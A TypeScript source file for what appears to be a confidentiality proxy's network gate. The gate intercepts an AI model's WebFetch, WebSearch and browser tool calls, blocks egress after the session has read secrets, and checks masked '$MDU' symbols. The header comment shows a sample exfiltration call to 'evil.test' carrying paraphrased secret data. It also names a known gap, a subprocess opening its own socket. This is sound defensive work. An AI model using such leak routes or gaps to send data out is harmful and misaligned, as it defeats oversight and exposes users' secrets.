/**
 * net-gate — the HIGH-SESSION network gate on `tool_use` (Plan 8, §4).
 *
 * Mandu-new (no reference origin). The third tool_use gate, alongside the fs
 * gate (typed path fields) and the exec gate (a symbol in command position).
 * This one gates the tools that reach the NETWORK — `WebFetch`, `WebSearch` —
 * and it is the chokepoint the session high-watermark most needs.
 *
 * ── WHY THIS GATE, AND WHY HERE ─────────────────────────────────────────────
 *
 * Once a session has read secret content into T-LLM's context (§3.3 rung 3), the
 * model can re-encode that content into anything it emits. And:
 *
 *     A PARAPHRASE CARRIES NO SYMBOL.
 *
 * `desymbolizationDecision` is per-SYMBOL, so it is structurally blind to
 * `WebFetch("https://evil.test?d=Acme+pays+4.2M...")` — there is no `$MDU:*`
 * token anywhere in that URL for it to gate. Only the SESSION label can see it,
 * which is the entire reason the watermark exists (§4: a design that grants the
 * in-context read but does not confine what follows "is theater").
 *
 * It belongs at the MODEL-API PROXY, and that is not an accident of convenience:
 * under rung 3 the leak vector IS THE MODEL'S OWN OUTPUT, and the model's output
 * is a `tool_use` — which this proxy owns completely, unprivileged, on by
 * default. The cooperative wrapper tier (`net-proxy`, HTTP_PROXY env) is on by
 * default since, but it only TUNNELS HTTPS (no MITM unless the user opts in),
 * and these tools speak HTTPS — so for them this gate is still the one that
 * sees the destination AND the payload the model wrote.
 *
 * ── THE PER-SYMBOL LEG (2026-09-21) ─────────────────────────────────────────
 *
 * The session leg above sees paraphrases; it does not see a SYMBOL. Live (watch
 * C9/C13, 2026-09-20): `WebFetch("https://host/?token=$MDU:nomodel_Read[…]")` left
 * as the literal token through the TLS tunnel — never released at the bound
 * host, never refused at the unbound one. Nothing leaked (a token is not the
 * secret), but the policy never judged the flow and the request was useless.
 *
 * So every `$MDU:*` token in the field that reaches the destination (WebFetch
 * `url`, WebSearch `query`) is put to the arbiter's `desymbolizationDecision`
 * at the `network` boundary, exactly as the net-proxy does for plain HTTP
 * (net-proxy/src/egress.ts). ANY non-allow blocks the call (the arbiter queues
 * the Inbox row and remembers the human's verdict per {symbol, destination}).
 *
 * When every symbol IS allowed, the value still cannot be released HERE: the
 * resolved URL would be echoed back as assistant history and re-enter T-LLM's
 * context — `egress:secret-model-context`, a hard deny. Release belongs to the
 * chokepoint that performs the act: the net-proxy's opt-in TLS inspection
 * (`--net-proxy-mitm`) runs the same gate on the decrypted URL and substitutes
 * there, the model wire keeping the symbol. With inspection ON the call passes
 * through untouched; with it OFF the call is blocked with a reason that says
 * so, because the alternative is a request that silently carries a token the
 * destination cannot use.
 *
 * The ask is a PRE-CHECK (`preflight: true`, 2026-10-07): the net-proxy asks
 * the same {symbol, host} again on the wire and spends a human's *Allow once*
 * there, so this ask reads it unspent (and spends a denial, which it enacts).
 * Before, this ask spent the once and the real send was held again
 * (arbiter-human-plane.md §10.3). A "Send without it" answer
 * (confidentiality.md §4 "Send without it") reads the same way: this pre-check is answered
 * `allow` (nothing is released here either), and the net-proxy's ask on
 * the wire spends it and sends the request with a marker in the symbol's
 * place; with TLS inspection off the call is blocked as below.
 *
 * ── FURTHER DESTINATIONS (2026-09-29) ────────────────────────────────────────
 *
 * Some tools name where they go in more than one field (gate-surface.ts
 * `alsoDestinations`): OpenClaw's browser reads `url` when `targetUrl` is
 * absent, and its image tools load a list of references, any of which may be
 * an http(s) URL. The session leg then asks once per distinct host (plus the
 * primary field's, or none), the per-symbol leg judges each string at its own
 * host, a further field the gate cannot read blocks the call, and so does a
 * call naming more than NET_GATE_MAX_DESTINATIONS hosts.
 *
 * ── WHAT IT DOES NOT COVER ──────────────────────────────────────────────────
 *
 * A subprocess that opens its own socket (`exec-curl-run-blindspot`,
 * exec-routing.md §6). That is the same residual the integrity lattice already
 * carries — and in a HIGH session the exec gate is blunt enough to cover it, by
 * blocking every command outright.
 */

import type { Arbiter, DesymbolizationDecision, RuleRef } from "./arbiter-client.js";
import { CLAUDE_CODE_GATE_SURFACE, type NetToolFields } from "./gate-surface.js";
import { refusedToolInput } from "./dispatch.js";

/** Fail-closed ceiling for one arbiter sessionEgressDecision. Same rationale and
 *  same value as the fs/exec gates: the gate runs on the SSE relay chain, so a
 *  wedged arbiter must be able to DENY, never to stall the turn. */
export const DEFAULT_NET_GATE_TIMEOUT_MS = 5000;

/** The reserved host denied URLs are rewritten to. `.invalid` is the reserved
 *  TLD (RFC 2606) — guaranteed never to resolve — so the tool FAILS at execution
 *  rather than silently reaching anything. The model reads why in the gate's
 *  notice, which replaces the call's result (netBlockNotice). */
export const DENIED_HOST = "blocked.mandu.invalid";

/** The reserved host a refusal that ASKED the user is rewritten to (the call
 *  carries an `approvalId`: the arbiter filed an Approvals row). The net-proxy
 *  answers it with a 403 that says the user was asked and the request may be
 *  made again after they answer, where {@link DENIED_HOST}'s 403 says do not
 *  retry (confidentiality.md §4, "How a watermark denial reaches the
 *  client"). CONNECT names only the host, so the host carries the
 *  difference. A twin lives in net-proxy (`ASKED_SENTINEL_HOST`); KEEP IN
 *  SYNC. */
export const ASKED_HOST = "asked.mandu.invalid";

/** Does `text` (a rewritten URL or field) name one of the gate's sentinel
 *  hosts, the final or the asked one? */
export function namesGateSentinel(text: string): boolean {
  return text.includes(DENIED_HOST) || text.includes(ASKED_HOST);
}

/** Claude Code's tools that reach the network: `destination` is the field
 *  naming the host (`null` ⇒ the tool egresses but names no destination we can
 *  check — a search query goes to the provider — so a high session fails closed
 *  on it); `symbols` is the field whose bytes reach the destination, scanned by
 *  the per-symbol leg (WebFetch's `prompt` goes to the client's own summarizer
 *  model call, not to the fetched host). The DEFAULT only: the proxy passes the
 *  session agent's own table (gate-surface.ts). */
const NET_TOOLS: Readonly<Record<string, NetToolFields>> = CLAUDE_CODE_GATE_SURFACE.net;

const own = (o: object, k: string): boolean => Object.prototype.hasOwnProperty.call(o, k);

/** A `$MDU:*` token. Mirrors arbiter/symbol-table/symbol-format.ts
 *  MDU_SYM_FORMAT.pattern (keep in sync; drifting TIGHTER only means a token
 *  goes un-gated here exactly as before this leg existed). */
const SYMBOL_RE = /\$MDU:[a-zA-Z_][a-zA-Z0-9_]*\[[0-9a-f]{4,8}\](?:\.[a-zA-Z_][a-zA-Z0-9_[\].]*)*/g;

/** Bound on how many distinct symbols one call may put to the arbiter; a call
 *  naming more is blocked outright (fail-closed, and no honest URL needs it). */
const NET_GATE_MAX_SYMBOLS = 16;

/** The sentinel path names WHY (for logs and the net-proxy); the model reads
 *  the reason in netBlockNotice, which replaces the call's result. */
const SENTINEL_SESSION = "high-session-egress-requires-approval";
const SENTINEL_SYMBOL = "symbol-egress-requires-approval";
const SENTINEL_TLS = "symbol-cannot-be-released-inside-this-tools-https-request";

function withTimeout<T>(p: Promise<T>, ms: number, message: string): Promise<T> {
  return new Promise<T>((resolve, reject) => {
    const t = setTimeout(() => reject(new Error(message)), ms);
    p.then(
      (v) => { clearTimeout(t); resolve(v); },
      (e) => { clearTimeout(t); reject(e as Error); },
    );
  });
}

export interface NetGateOutcome {
  tool: string;
  /** The destination the model asked for, or null when the tool names none. */
  destination: string | null;
  decision: "allow" | "block";
  reason: string;
  /** The sentinel URL the field was rewritten to, when blocked. */
  sentinel?: string;
  /** What the model reads in place of the call's result, when blocked
   *  (netBlockNotice: from the decision, never from the request). */
  notice?: string;
  /** Decision provenance (policy-surface.md §9.3). */
  ruleRef?: RuleRef;
  /** The Approvals row the arbiter filed or bumped for this refusal (the
   *  session leg, confidentiality.md §4 "The human half"; the per-symbol
   *  leg's egress row): the deny event's `policy.approvalId`. */
  approvalId?: string;
}

export interface NetGateResult {
  /** The (possibly rewritten) tool input. */
  input: unknown;
  /** Present only when this tool is a network tool AND the axis had something
   *  to say. Absent ⇒ nothing happened; the caller passes the input through. */
  outcome?: NetGateOutcome;
}

export interface NetGateOptions {
  arbiter: Arbiter;
  /** The session whose watermark is consulted. ABSENT ⇒ the gate cannot attribute
   *  the call to a session and does NOT gate — matching every other
   *  session-scoped decision, and safe because the watermark can only ever ADD
   *  restriction (an unattributable call is exactly today's behavior). */
  sessionKey?: string;
  log?: (m: string) => void;
  timeoutMs?: number;
  /** True when the net-proxy TLS-inspects non-model HTTPS (`--net-proxy-mitm`):
   *  an ALLOWED symbol is then released at that chokepoint, so the call passes
   *  through with its symbol. False/absent ⇒ an allowed symbol still cannot be
   *  released inside this tool's request, and the call is blocked with a reason
   *  that says so. */
  tlsInspected?: boolean;
  /** The session agent's network tools (gate-surface.ts GateSurface.net:
   *  `webfetch` on opencode, `web_fetch` on openclaw). Default: Claude Code's
   *  WebFetch/WebSearch. */
  netTools?: Readonly<Record<string, NetToolFields>>;
}

/** Best-effort host of a URL the MODEL wrote. Never throws. */
export function hostOf(raw: unknown): string | null {
  if (typeof raw !== "string" || raw.trim() === "") return null;
  try {
    return new URL(raw.trim()).host || null;
  } catch {
    return null;
  }
}

/**
 * Gate a network-bearing `tool_use` against the session watermark.
 *
 * NEVER THROWS. An arbiter that errors or wedges is treated exactly as a DENY
 * (the fail-closed invariant): a caller that cannot learn the verdict must not
 * be able to reach the network on the strength of not knowing.
 */
export async function gateNetToolUse(
  toolName: string,
  input: unknown,
  opts: NetGateOptions,
): Promise<NetGateResult> {
  const r = await gateNetToolUseFields(toolName, input, opts);
  // A tool whose other fields would still act on a block (a browser that
  // types, a message with attachments, a generator that uploads reference
  // files; tool-gate-surface.ts `block: "refuse"`) is refused whole: its
  // input becomes one its schema rejects, carrying only the reason.
  const netTools = opts.netTools ?? NET_TOOLS;
  if (r.outcome?.decision === "block" && own(netTools, toolName) && netTools[toolName]!.block === "refuse") {
    return { input: refusedToolInput(r.outcome.notice ?? netBlockNotice(SENTINEL_SESSION, r.outcome.reason, r.outcome.ruleRef)), outcome: r.outcome };
  }
  return r;
}

/** Bound on how many distinct destinations one call may put to the session
 *  leg (OpenClaw's image tool loads at most 20 by default); a call naming
 *  more is blocked outright (fail-closed). */
const NET_GATE_MAX_DESTINATIONS = 20;

/** One string a network call names in a destination field. */
interface DestinationValue {
  field: string;
  value: string;
  /** Its host, or null (a local path, a `data:` URL: no network destination). */
  host: string | null;
}

/** The strings in a tool's further destination fields (NetToolFields
 *  `alsoDestinations`: a string, or each string of an array), and the first
 *  field whose value the gate cannot read (neither a string nor an array). */
function alsoDestinationValues(
  spec: NetToolFields,
  obj: Record<string, unknown> | null,
): { values: DestinationValue[]; unreadable: string | null } {
  const values: DestinationValue[] = [];
  for (const field of spec.alsoDestinations ?? []) {
    if (!obj || !own(obj, field)) continue;
    const v = obj[field];
    if (v === undefined || v === null) continue;
    if (typeof v === "string") values.push({ field, value: v, host: hostOf(v) });
    else if (Array.isArray(v)) {
      // a non-string element is skipped by the tool as well (OpenClaw's image
      // tool filters them out)
      for (const el of v) if (typeof el === "string") values.push({ field, value: el, host: hostOf(el) });
    } else return { values, unreadable: field };
  }
  return { values, unreadable: null };
}

async function gateNetToolUseFields(
  toolName: string,
  input: unknown,
  opts: NetGateOptions,
): Promise<NetGateResult> {
  const netTools = opts.netTools ?? NET_TOOLS;
  if (!own(netTools, toolName)) return { input };

  const spec = netTools[toolName]!;
  const field = spec.destination;
  const obj = (input && typeof input === "object") ? input as Record<string, unknown> : null;
  const destination = field === null ? null : hostOf(obj?.[field]);
  const timeoutMs = opts.timeoutMs ?? DEFAULT_NET_GATE_TIMEOUT_MS;

  // The further destination fields (an alias, a list of URLs). A value the
  // gate cannot read is a destination it cannot check: fail closed.
  const also = alsoDestinationValues(spec, obj);
  if (also.unreadable !== null) {
    const reason = `${toolName}.${also.unreadable} names destinations the gate cannot read (neither a string nor a list of strings) — fail closed`;
    opts.log?.(`net-gate: ${toolName} → BLOCK (${reason})`);
    return blocked(toolName, spec, obj, destination, reason, { source: "fail-closed", id: "proxy:net-gate-unreadable" });
  }

  // The session leg asks once per distinct destination: the primary one (none
  // when the tool names none, or the call leaves the field empty: the
  // arbiter decides a destination-less egress), then every further host.
  const asks: Array<string | null> = [destination];
  for (const v of also.values) if (v.host !== null && !asks.includes(v.host)) asks.push(v.host);
  if (asks.length > NET_GATE_MAX_DESTINATIONS) {
    const reason = `${asks.length} destinations in one network call exceeds the gate's bound (${NET_GATE_MAX_DESTINATIONS}) — fail closed`;
    opts.log?.(`net-gate: ${toolName} → BLOCK (${reason})`);
    return blocked(toolName, spec, obj, destination, reason, { source: "fail-closed", id: "proxy:net-gate-destination-bound" });
  }

  // The session leg needs a session to ask about and an arbiter that has a
  // watermark; the per-symbol leg needs neither, so it runs either way.
  if (!opts.sessionKey || !opts.arbiter.sessionEgressDecision) {
    return gateSymbols(toolName, spec, obj, destination, also.values, input, opts, timeoutMs);
  }

  for (const ask of asks) {
    let verdict: { allow: boolean; requiresApproval: boolean; reason: string; ruleRef?: RuleRef; approvalId?: string };
    try {
      verdict = await withTimeout(
        opts.arbiter.sessionEgressDecision({
          sessionKey: opts.sessionKey,
          boundary: "network",
          ...(ask ? { destination: ask } : {}),
        }),
        timeoutMs,
        `arbiter sessionEgressDecision timed out after ${timeoutMs}ms — fail closed`,
      );
    } catch (err) {
      // Unreachable/wedged arbiter ⇒ DENY. We cannot prove the session is low, and
      // "we could not check" must never resolve to "go ahead".
      const reason = `arbiter unreachable — fail closed: ${(err as Error).message}`;
      opts.log?.(`net-gate: ${toolName} → BLOCK (${reason})`);
      return blocked(toolName, spec, obj, ask, reason,
        { source: "fail-closed", id: "proxy:arbiter-unreachable" });
    }
    if (!verdict.allow) {
      // A refusal the arbiter filed a row for asks the user (confidentiality.md
      // §4, "The human half"): the call goes to the asked sentinel and its
      // notice says so. Without an id it is final.
      const approvalId = typeof verdict.approvalId === "string" && verdict.approvalId !== "" ? verdict.approvalId : undefined;
      opts.log?.(`net-gate: ${toolName} → BLOCK (${verdict.reason})${approvalId ? ` [asked ${approvalId}]` : ""}`);
      return blocked(toolName, spec, obj, ask, verdict.reason, verdict.ruleRef, SENTINEL_SESSION, approvalId);
    }
  }
  return gateSymbols(toolName, spec, obj, destination, also.values, input, opts, timeoutMs);
}

/** The strings of a call that reach a destination, each with the host its
 *  symbols are judged against: the payload and primary destination fields at
 *  the primary host, each further destination string at its own host. */
function symbolCarriers(
  spec: NetToolFields,
  obj: Record<string, unknown> | null,
  destination: string | null,
  also: readonly DestinationValue[],
): Array<{ text: string; destination: string | null }> {
  const out: Array<{ text: string; destination: string | null }> = [];
  for (const f of new Set([spec.symbols, ...(spec.destination !== null ? [spec.destination] : [])])) {
    const v = obj?.[f];
    if (typeof v === "string") out.push({ text: v, destination });
  }
  for (const v of also) out.push({ text: v.value, destination: v.host });
  return out;
}

/** The distinct `$MDU:*` tokens in the fields that reach the destination
 *  (the payload field, the destination field, every further destination). */
export function netToolSymbols(toolName: string, input: unknown, netTools: Readonly<Record<string, NetToolFields>> = NET_TOOLS): string[] {
  if (!own(netTools, toolName)) return [];
  const spec = netTools[toolName]!;
  const obj = input && typeof input === "object" ? input as Record<string, unknown> : null;
  const out = new Set<string>();
  for (const c of symbolCarriers(spec, obj, null, alsoDestinationValues(spec, obj).values)) {
    if (c.text.includes("$MDU:")) for (const s of c.text.match(SYMBOL_RE) ?? []) out.add(s);
  }
  return [...out];
}

/**
 * The per-symbol leg (header: THE PER-SYMBOL LEG). Runs only after the session
 * leg allowed (or did not apply). NEVER THROWS; an arbiter that errors, wedges,
 * or lacks the op while a symbol is present is a DENY.
 */
async function gateSymbols(
  toolName: string,
  spec: NetToolFields,
  obj: Record<string, unknown> | null,
  destination: string | null,
  also: readonly DestinationValue[],
  input: unknown,
  opts: NetGateOptions,
  timeoutMs: number,
): Promise<NetGateResult> {
  // every (symbol, host) pair the call carries, once
  const pairs: Array<{ symbol: string; destination: string | null }> = [];
  const seen = new Set<string>();
  const distinct = new Set<string>();
  for (const c of symbolCarriers(spec, obj, destination, also)) {
    if (!c.text.includes("$MDU:")) continue;
    for (const symbol of c.text.match(SYMBOL_RE) ?? []) {
      distinct.add(symbol);
      const k = `${symbol}\u0000${c.destination ?? ""}`;
      if (seen.has(k)) continue;
      seen.add(k);
      pairs.push({ symbol, destination: c.destination });
    }
  }
  if (pairs.length === 0) return { input };
  const deny = (reason: string, ruleRef: RuleRef | undefined, slug: string, at: string | null = destination, approvalId?: string): NetGateResult => {
    opts.log?.(`net-gate: ${toolName} → BLOCK (${reason})`);
    return blocked(toolName, spec, obj, at, reason, ruleRef, slug, approvalId);
  };
  if (distinct.size > NET_GATE_MAX_SYMBOLS) {
    return deny(`${distinct.size} symbols in one network call exceeds the gate's bound (${NET_GATE_MAX_SYMBOLS}) — fail closed`,
      { source: "fail-closed", id: "proxy:net-gate-symbol-bound" }, SENTINEL_SYMBOL);
  }
  const decide = opts.arbiter.desymbolizationDecision?.bind(opts.arbiter);
  if (!decide) {
    return deny("this arbiter cannot judge a symbol's network egress — fail closed",
      { source: "fail-closed", id: "proxy:arbiter-unreachable" }, SENTINEL_SYMBOL);
  }
  let known = 0;
  for (const { symbol, destination: at } of pairs) {
    let d: DesymbolizationDecision;
    try {
      d = await withTimeout(
        decide({
          symbol,
          boundary: "network",
          ...(at ? { destination: at } : {}),
          asCommand: false,
          // A pre-check: the release (if any) happens at the net-proxy,
          // which asks again and spends a human's Allow once there; this
          // ask reads it unspent, so one Allow once is one real send
          // (arbiter-human-plane.md §10.3). A denial is spent here.
          preflight: true,
          ...(opts.sessionKey ? { sessionKey: opts.sessionKey } : {}),
        }),
        timeoutMs,
        `arbiter desymbolizationDecision timed out after ${timeoutMs}ms — fail closed`,
      );
    } catch (err) {
      return deny(`arbiter unreachable — fail closed: ${(err as Error).message}`,
        { source: "fail-closed", id: "proxy:arbiter-unreachable" }, SENTINEL_SYMBOL, at);
    }
    if (!d.allow) {
      const approvalId = typeof d.approvalId === "string" && d.approvalId !== "" ? d.approvalId : undefined;
      return deny(d.reason, d.ruleRef, SENTINEL_SYMBOL, at, approvalId);
    }
    // A token the arbiter never allocated resolves to nothing anywhere: it is
    // text, not a datum, and says nothing about release.
    if (d.ruleRef?.id !== "egress:unknown-symbol") known++;
  }
  if (known === 0 || opts.tlsInspected) return { input };
  return deny(
    "the policy allows this symbol at this destination, but its value cannot be released inside this tool's " +
      "HTTPS request: the network gate sees only an encrypted tunnel, so the destination would have received the " +
      "literal token. Nothing was sent. Release needs the network proxy's TLS inspection (--net-proxy-mitm), or a " +
      "client whose request the network proxy can read.",
    { source: "fail-closed", id: "proxy:symbol-in-tls-tunnel" },
    SENTINEL_TLS,
  );
}

function blocked(
  tool: string,
  spec: NetToolFields,
  obj: Record<string, unknown> | null,
  destination: string | null,
  reason: string,
  ruleRef?: RuleRef,
  slug: string = SENTINEL_SESSION,
  approvalId?: string,
): NetGateResult {
  // A refusal that filed an Approvals row goes to the ASKED host, whose 403
  // invites a retry after the answer; any other to the final one.
  const sentinel = `https://${approvalId ? ASKED_HOST : DENIED_HOST}/${slug}`;
  // Rewrite the destination field so the tool cannot execute. A tool with NO
  // destination field (WebSearch) is neutralized by rewriting its input to one
  // that names the sentinel, so the call still fails rather than running.
  // Every further destination field present goes to the sentinel too.
  const notice = netBlockNotice(slug, reason, ruleRef, approvalId !== undefined);
  const next: Record<string, unknown> = { ...(obj ?? {}) };
  if (spec.destination !== null) next[spec.destination] = sentinel;
  else next.query = notice;
  for (const f of spec.alsoDestinations ?? []) {
    if (!own(next, f) || next[f] === undefined || next[f] === null) continue;
    next[f] = Array.isArray(next[f]) ? [sentinel] : sentinel;
  }

  return {
    input: next,
    outcome: { tool, destination, decision: "block", reason, sentinel, notice, ...(ruleRef ? { ruleRef } : {}), ...(approvalId ? { approvalId } : {}) },
  };
}

/**
 * What the model reads when the net gate blocks its call (confidentiality
 * plan 10 §11.8, "The net gate's notice"): the call's result is REPLACED by
 * this text (proxy.ts ResultNotices), since the tool only reached the
 * blocked host. Built from the gate's own decision (which leg refused, the
 * rule id, whether the arbiter filed an approval), never from the request:
 * no URL, no host, no query, no arbiter reason (which names the destination
 * the model wrote). A host may itself carry data (a subdomain spelled from
 * what the session read), so it is left out by construction.
 *
 * `asked`: the arbiter filed an Approvals row for this refusal (the call's
 * `approvalId`). The session leg then says the user was asked and the model
 * may make the request again after they answer (confidentiality.md §4, "The
 * human half", 2026-10-11); a human Block reads as final.
 */
export function netBlockNotice(slug: string, reason: string, ruleRef?: RuleRef, asked = false): string {
  // The proxy's own fail-closed legs (an unreadable field, a bound, an
  // arbiter that did not answer); an arbiter rule that fails closed (an
  // unknown destination) is a policy answer, worded by its leg.
  const failClosed = ruleRef?.source === "fail-closed" && (ruleRef.id ?? "").startsWith("proxy:");
  let plain: string;
  if (slug === SENTINEL_TLS) {
    plain = "the request carries a masked value ($MDU placeholder) that Mandu cannot put back inside this tool's HTTPS request, so the host would have received the placeholder itself";
  } else if (failClosed) {
    plain = ruleRef?.id === "proxy:arbiter-unreachable"
      ? "the Mandu service is not answering, so the request could not be checked (mandu status shows the service)"
      : "Mandu could not check this request, so it did not send it";
  } else if (slug === SENTINEL_SESSION) {
    // The session leg asks the user when the arbiter filed a row (the
    // human half, confidentiality.md §4, 2026-10-11): the Approvals page is
    // named only then, since a model once sent the user to an empty page
    // (handling-prompt.md §7). A human Block is final; a refusal with no row
    // (an arbiter predating the queue) keeps the way out of before: a new
    // session.
    plain = asked
      ? "this session has read a secret, and this request goes to a host that secret is not bound to, so Mandu stopped it and asked the user on Mandu's Approvals page (mandu dashboard). Tell the user, and make the request again after they answer: if they allowed it, it goes through once"
      : /human-denied/.test(reason)
        ? "this session has read a secret, and the user blocked requests from this session to this host; do not retry it"
        : "this session has read a secret, and this request goes to a host that secret is not bound to; start a new session for work that needs it";
  } else {
    plain = "the request carries a masked value ($MDU placeholder) that may not be sent where this tool sends it";
  }
  const asks = !failClosed && slug !== SENTINEL_SESSION && (asked || /approval|declassification|→ pending/i.test(reason));
  const next = asks
    ? " The user can allow it on the Mandu dashboard's Approvals page (mandu dashboard): tell them, and do not retry before they answer."
    : "";
  return `mandu-net-gate: network use blocked, nothing was sent: ${plain}.${next} (rule: ${ruleRef?.id ?? "none"})`;
}

// ── History restoration ──────────────────────────────────────────────────────

/** Remembered blocks are bounded; the oldest is dropped first. */
export const NET_GATE_HISTORY_MAX = 512;

/**
 * Puts the model's OWN call back into the conversation history.
 *
 * A blocked `tool_use` reaches the client with its destination rewritten to the
 * sentinel, and the client echoes that rewritten block back as history on every
 * later request. T-LLM then reads a past in which it called
 * `WebFetch("https://blocked.mandu.invalid/…")` itself, and it repeats what it
 * reads: in watch C7 (2026-09-20), after one denied fetch the model wrote the
 * SENTINEL url for the next, bound and allowed, destination, so a legitimate
 * release failed on a URL the policy never judged. With the bound fetch ordered
 * first the same session passes, which isolates the echoed rewrite as the cause.
 *
 * So the rewrite stays where it enforces (the wire to the client, which is what
 * executes) and is undone where it only misinforms (the request to the model).
 *
 * SECURITY: what is restored is the input T-LLM itself emitted, captured before
 * any other transform touched it. It is model-authored text returning to the
 * model that authored it; no tool output, no desymbolized value and no HumanView
 * byte enters the context this way. A block is restored only when its id is one
 * this proxy blocked AND its current input still equals the rewrite this proxy
 * produced, so nothing else in the history can be altered through it.
 *
 * UTILITY-ONLY and in-memory: a proxy restart forgets the map and the history
 * reads as the sentinel again (the pre-2026-09-20 behavior), never worse.
 */
export class NetGateHistory {
  private readonly blocks = new Map<string, { original: unknown; rewritten: string }>();

  remember(callId: string | undefined, original: unknown, rewritten: unknown): void {
    if (!callId) return;
    try {
      this.blocks.set(callId, { original: structuredClone(original), rewritten: JSON.stringify(rewritten) });
      while (this.blocks.size > NET_GATE_HISTORY_MAX) {
        const oldest = this.blocks.keys().next().value;
        if (oldest === undefined) break;
        this.blocks.delete(oldest);
      }
    } catch { /* utility-only */ }
  }

  /** Restore every remembered block in an Anthropic Messages request body, in
   *  place. Returns the ids restored. NEVER throws. */
  restore(request: unknown): string[] {
    const restored: string[] = [];
    if (this.blocks.size === 0) return restored;
    try {
      const messages = (request as { messages?: unknown })?.messages;
      if (!Array.isArray(messages)) return restored;
      for (const m of messages) {
        const msg = m as { role?: unknown; content?: unknown };
        if (msg?.role !== "assistant" || !Array.isArray(msg.content)) continue;
        for (const b of msg.content) {
          const block = b as { type?: unknown; id?: unknown; input?: unknown };
          if (block?.type !== "tool_use" || typeof block.id !== "string") continue;
          const known = this.blocks.get(block.id);
          if (!known || JSON.stringify(block.input) !== known.rewritten) continue;
          block.input = structuredClone(known.original);
          restored.push(block.id);
        }
      }
    } catch { /* utility-only */ }
    return restored;
  }
}
